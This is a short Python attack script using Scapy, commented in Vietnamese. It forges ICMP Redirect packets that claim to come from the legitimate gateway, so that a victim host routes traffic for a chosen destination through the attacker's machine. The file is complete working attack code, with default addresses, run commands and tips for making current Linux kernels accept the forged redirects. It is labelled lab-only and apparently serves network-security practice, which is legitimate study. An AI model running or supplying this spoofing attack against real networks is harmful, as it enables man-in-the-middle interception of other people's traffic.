#!/usr/bin/env python3
# redirect_attack.py - Gia mao goi ICMP Redirect (type 5, code 1 = Host Redirect)
# de ep nan nhan dinh tuyen toi 'dst' qua may tan cong => chen vao duong di (MITM).
# LAB-ONLY: chi chay trong moi truong namespace co lap.
#
# Chay trong namespace attacker (can root):
#   sudo ip netns exec atk python3 redirect_attack.py
#   sudo ip netns exec atk python3 redirect_attack.py --dst 10.0.1.5
#
import argparse
from scapy.all import IP, ICMP, send


def main():
    ap = argparse.ArgumentParser(description="Fake ICMP Redirect - MITM (lab-only)")
    ap.add_argument("--victim",   default="10.0.0.2",  help="IP nan nhan")
    ap.add_argument("--gateway",  default="10.0.0.1",  help="IP gateway hop phap (gia danh lam nguon redirect)")
    ap.add_argument("--attacker", default="10.0.0.66", help="IP attacker = 'gateway moi' ma ta muon ep nan nhan dung")
    ap.add_argument("--dst",      default="10.0.1.5",  help="Dia chi dich o mang xa can chuyen huong")
    ap.add_argument("--repeat",   type=int,   default=10,
                    help="So lan gui redirect (kernel moi thuong can lap vai lan moi chiu nhan)")
    ap.add_argument("--interval", type=float, default=0.3, help="Khoang cach giua cac lan gui (giay)")
    args = ap.parse_args()

    # Goi 'goc' gia lap luu luong cua victim toi dst -> cho kernel biet ap redirect cho dich NAO.
    orig = IP(src=args.victim, dst=args.dst) / ICMP(id=1, seq=1)

    # ICMP Redirect: nguon GIA DANH = gateway hop phap, bao victim dung gateway moi = attacker.
    #   type=5, code=1  -> Redirect for Host
    #   gw=<attacker>   -> dia chi gateway moi nhet vao thong diep
    redir = IP(src=args.gateway, dst=args.victim) / ICMP(type=5, code=1, gw=args.attacker) / orig

    # Gui lap nhieu lan: kernel 6.x chi chiu nhan redirect khi co luong dang chay lien tuc
    # va redirect den vai lan. Hay chay song song voi mot 'ping 10.0.1.5' lien tuc o victim.
    send(redir, count=args.repeat, inter=args.interval, verbose=0)
    print(f"[+] Da gui {args.repeat} goi ICMP Redirect GIA: ep {args.victim} di toi {args.dst} "
          f"qua gateway moi {args.attacker}")
    print(f"    (gia danh nguon = gateway hop phap {args.gateway})")


if __name__ == "__main__":
    main()
